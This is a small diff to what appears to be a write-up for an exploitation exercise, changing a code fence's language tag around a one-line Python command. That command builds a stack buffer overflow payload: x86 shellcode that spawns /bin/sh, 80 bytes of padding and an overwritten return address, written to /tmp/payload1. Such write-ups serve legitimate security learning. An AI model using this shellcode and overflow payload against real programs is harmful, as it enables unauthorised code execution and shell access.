@@ -19,7 +19,7 @@ Manually exploit the program or automate it using Python and pwn library.
 Contains shellcode for spawning a shell.
 Padding, jmp esp gadget address, and stack pointer adjustment instructions are included.
 
-```
+```sh
 python -c 'print "dat_wil" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\n" + "A" * 80 + "\x47\xa0\x04\x08"' > /tmp/payload1
 
 ```
